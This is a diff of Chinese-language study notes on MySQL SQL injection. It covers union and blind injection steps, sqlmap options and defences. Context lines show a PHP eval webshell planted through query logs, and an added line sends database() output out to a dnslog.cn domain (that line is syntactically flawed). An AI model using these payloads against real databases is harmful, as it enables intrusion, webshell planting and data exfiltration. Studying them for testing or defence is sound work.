@@ -45,6 +45,14 @@ SELECT id FROM emp_tbl UNION ALL SELECT NAME FROM emp_tbl
 
 ### 常用函数:
 
+#### user()
+
+查询数据库当前用户
+
+#### database()
+
+查询当前数据库
+
 #### concat和group_concat
 
 **表结构:**![image-20220905201127882](SQL注入.assets/image-20220905201127882.png)
@@ -107,7 +115,7 @@ SELECT GROUP_CONCAT(id ,"--",NAME SEPARATOR '||' ),DATE FROM emp_tbl
 
 
 
-该函数用于获取字符串的长度。
+该函数用于获取字符串的字节长度。
 
 ```mysql
 SELECT LENGTH(NAME) FROM emp_tbl			#汉字在utf8编码中,汉字占3个字节,所以length()出来是汉字个数*3
@@ -377,9 +385,9 @@ into outfile()函数可以将字符串写入文件，此函数的执行也需要
 
    注:如果加入一个结束符后出现报错,则代表参数的结束符最少包含该字符,也可能还有别的字符
 
-3. 判断数据库版本是否大于4,以便后面使用information_schema库
-
 4. 通过order by num的方式让系统自己报错,慢慢尝试从而找到数据库的准确列数
+
+4. 判断数据库版本是否大于4,以便后面使用information_schema库
 
 5. 给原有的url中的字段指定一个不存在的值,使其查不到内容,从而显示联合查询后面的内容
 
@@ -612,6 +620,8 @@ count函数是用来统计表中或数组中记录的一个函数，下面我来
 
 7. 反复操作,查询出所有想查询的内容
 
+如果内容是中文,如何盲注?
+
 ## 时间盲注
 
 ### 适用场景:
@@ -813,6 +823,8 @@ select '<?php eval($_POST["a"]); ?>'#执行生成包含木马日志的查询
 
 ## 表单注入
 
+表单注入中的各种符号不再需要提前编码
+
 ### 表单注入思路
 
 1. 找到注入点
@@ -891,7 +903,15 @@ update会修改数据库里原有记录的值,如果select注入只能使用延�
    ```mysql
    select load_file("\\\\test.xkpb07.dnslog.cn\\aa");
    #xkpb07.dnslog.cn是在dnslog生成的三级域名,可以使用concat将要查询的内容放到第四级域名,如果数据库用户有文件读写权限,则可以将查询内容带到dnslog.cn上面
+   select load_file("\\\\",database(),".xkpb07.dnslog.cn\\aa");
    ```
+
+
+
+可不可以通过不受secure_file_priv限制的load data infile 或者 load data local infile 执行dnslog注入
+
+
+
 ## 宽字节注入:
 
 如果后端将前端传回的特殊符号全部进行处理，在闭合符等特殊符号前添加了反斜杠\将特殊符号全部转义成了普通的符号，此时注入语句中添加的闭合符就会失效，导致注入语句被当成字符串处理。如果后端使用了GBK编码，这种情况就可以使用宽字节注入。
@@ -1189,6 +1209,12 @@ sqlmap目录中temper文件夹下有很多脚本,通过--temper 文件名.py调�
 或
 --safe-freq 每次测试请求之后都会访问一下的安全URL
 ```
+
+
+
+![image-20220919101302771](SQL%E6%B3%A8%E5%85%A5(MySQL).assets/image-20220919101302771.png)
+
+
 
 ## SQLi的防御和修复
 
